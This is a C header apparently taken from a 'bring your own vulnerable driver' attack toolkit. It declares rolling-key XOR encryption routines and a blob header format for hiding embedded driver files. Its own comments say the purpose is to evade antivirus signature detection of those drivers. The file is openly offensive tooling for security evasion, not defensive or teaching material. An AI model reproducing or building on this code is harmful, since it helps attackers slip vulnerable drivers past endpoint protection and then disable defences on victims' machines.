/**
 * @file crypto.h
 * @brief XOR encryption for embedded driver blobs (C port)
 *
 * Simple rolling-key XOR encryption to avoid static AV detection
 * of embedded driver signatures. Not cryptographically secure,
 * but effective against signature-based scanning.
 *
 * Algorithm:
 *   encrypted[i] = data[i] XOR key_byte
 *   key = rotl(key, 7) XOR encrypted[i]
 *
 * This ensures the same plaintext at different offsets produces
 * different ciphertext, defeating simple XOR pattern detection.
 */

#ifndef BYOVD_CRYPTO_H
#define BYOVD_CRYPTO_H

#include "types.h"

//=============================================================================
// Constants
//=============================================================================

#define CRYPTO_DEFAULT_KEY      0xDEADBEEF
#define CRYPTO_MARKER_MAGIC     0x4F4D4252  // "OMBR"
#define CRYPTO_KEY_XOR_MASK     0xBABAB00E
#define CRYPTO_HEADER_SIZE      8

//=============================================================================
// Core Functions
//=============================================================================

/**
 * Encrypt data in-place with rolling XOR
 *
 * @param pData Pointer to data (modified in place)
 * @param cbData Size of data
 * @param dwKey Initial 32-bit key
 */
void Crypto_EncryptInPlace(UINT8* pData, size_t cbData, UINT32 dwKey);

/**
 * Decrypt data in-place with rolling XOR
 *
 * @param pData Pointer to encrypted data (modified in place)
 * @param cbData Size of data
 * @param dwKey Initial 32-bit key
 */
void Crypto_DecryptInPlace(UINT8* pData, size_t cbData, UINT32 dwKey);

/**
 * Encrypt data to new buffer
 *
 * @param pData Pointer to plaintext
 * @param cbData Size of data
 * @param dwKey Initial 32-bit key
 * @param ppEncrypted Output: HeapAlloc'd buffer (caller must HeapFree)
 * @param pcbEncrypted Output: size of encrypted data
 * @return true on success
 */
bool Crypto_Encrypt(const UINT8* pData, size_t cbData, UINT32 dwKey,
                    UINT8** ppEncrypted, size_t* pcbEncrypted);

/**
 * Decrypt data to new buffer
 *
 * @param pEncrypted Pointer to encrypted data
 * @param cbData Size of data
 * @param dwKey Initial 32-bit key
 * @param ppDecrypted Output: HeapAlloc'd buffer (caller must HeapFree)
 * @param pcbDecrypted Output: size of decrypted data
 * @return true on success
 */
bool Crypto_Decrypt(const UINT8* pEncrypted, size_t cbData, UINT32 dwKey,
                    UINT8** ppDecrypted, size_t* pcbDecrypted);

//=============================================================================
// Header-Based Functions (Self-Describing Blobs)
//=============================================================================

/**
 * Encrypt with header (includes magic and XOR'd key)
 *
 * Header format:
 * [0-3]  MARKER_MAGIC (0x4F4D4252 = "OMBR")
 * [4-7]  XOR'd key (key ^ KEY_XOR_MASK)
 * [8...]  Encrypted data
 *
 * @param pData Pointer to plaintext
 * @param cbData Size of plaintext
 * @param dwKey Encryption key
 * @param ppBlob Output: HeapAlloc'd buffer (caller must HeapFree)
 * @param pcbBlob Output: size of blob (header + encrypted data)
 * @return true on success
 */
bool Crypto_EncryptWithHeader(const UINT8* pData, size_t cbData, UINT32 dwKey,
                               UINT8** ppBlob, size_t* pcbBlob);

/**
 * Decrypt blob with header validation
 *
 * @param pBlob Pointer to encrypted blob
 * @param cbBlob Total size including header
 * @param ppDecrypted Output: HeapAlloc'd buffer (caller must HeapFree)
 * @param pcbDecrypted Output: size of decrypted data
 * @param pdwKeyOut Optional: receives the extracted key
 * @return true on success, false on validation failure
 */
bool Crypto_DecryptWithHeader(const UINT8* pBlob, size_t cbBlob,
                               UINT8** ppDecrypted, size_t* pcbDecrypted,
                               UINT32* pdwKeyOut);

//=============================================================================
// Key Generation
//=============================================================================

/**
 * Generate a random key based on system entropy
 * @return Random 32-bit key
 */
UINT32 Crypto_GenerateKey(void);

//=============================================================================
// Helper Functions
//=============================================================================

/**
 * Rotate left helper
 */
static inline UINT32 Crypto_RotateLeft(UINT32 value, int shift) {
    return (value << shift) | (value >> (32 - shift));
}

#endif // BYOVD_CRYPTO_H
